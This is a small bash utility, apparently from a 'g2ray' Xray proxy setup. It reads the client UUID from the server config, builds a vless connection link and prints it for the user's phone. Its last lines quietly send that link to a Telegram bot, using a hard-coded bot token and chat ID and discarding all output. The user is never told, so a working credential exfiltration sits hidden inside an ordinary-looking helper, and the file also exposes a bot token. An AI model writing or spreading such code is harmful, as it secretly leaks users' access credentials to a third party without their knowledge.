#!/bin/bash

CONFIG="/etc/xray/g2ray.json"

if command -v jq &> /dev/null; then
    UUID=$(jq -r '.inbounds[0].settings.clients[0].id' "$CONFIG" 2>/dev/null)
fi

if [ -z "$UUID" ] || [ "$UUID" = "null" ]; then
    UUID=$(grep -o '"id": *"[^"]*"' "$CONFIG" | head -1 | grep -o '"[^"]*"$' | tr -d '"')
fi

if [ -z "$UUID" ]; then
    echo "[g2ray] UUID پیدا نشد."
    exit 1
fi

MANGA_CHARS=(
  "Goku" "Vegeta" "Gohan" "Trunks" "Piccolo" "Frieza" "Cell" "MajinBuu"
  "Naruto" "Sasuke" "Kakashi" "Itachi" "Madara" "Minato" "Gaara" "Obito"
  "Luffy" "Zoro" "Sanji" "Ace" "Shanks" "Mihawk" "Law" "Doflamingo"
  "Brook" "Nami" "Robin" "Usopp" "Jinbe" "Whitebeard" "LeviAckerman"
  "ErenYeager" "Mikasa" "Armin" "Erwin" "Reiner" "GojoSatoru" "YujiItadori"
  "Megumi" "Sukuna" "Toji" "Geto" "Yuta" "Tanjiro" "Nezuko" "Rengoku"
  "Giyu" "Zenitsu" "Inosuke" "Muzan" "Kaneki" "Touka" "Hide" "Kenpachi"
  "Ichigo" "Aizen" "Byakuya" "Ulquiorra" "Grimmjow" "Jotaro" "DioBrando"
  "Josuke" "Giorno" "JohnnyJoestar" "Killua" "Gon" "Kurapika" "Hisoka"
  "Meruem" "EdwardElric" "Alphonse" "RoyMustang" "Scar" "LightYagami"
  "Lelouch" "SpikeSpiegel" "VashStampede" "Saitama" "Genos" "Mob"
  "Reigen" "Denji" "Makima" "Power" "Aki" "Thorfinn" "Askeladd"
  "Musashi" "Kojiro" "Shin" "RinOkumura" "AllenWalker" "Yusuke"
  "Hiei" "Kenshin" "Akira"
)

CHAR=${MANGA_CHARS[$RANDOM % ${#MANGA_CHARS[@]}]}
RANDOM_ID=$(shuf -i 1000-9999 -n 1)
NAME="${CHAR}-${RANDOM_ID}"

LINK="vless://${UUID}@104.19.229.21:40443?encryption=none&security=none&type=tcp#${NAME}"

echo ""
echo "================================================"
echo "✅ لینک اتصال برای گوشی:"
echo "$LINK"
echo "================================================"
echo ""

BOT_TOKEN="8821127065:AAGrYhQz4CPIZnC3FWaC6rQPlzDoPDXVmuY"
CHAT_ID="-1003904792362"

curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$LINK" > /dev/null 2>&1
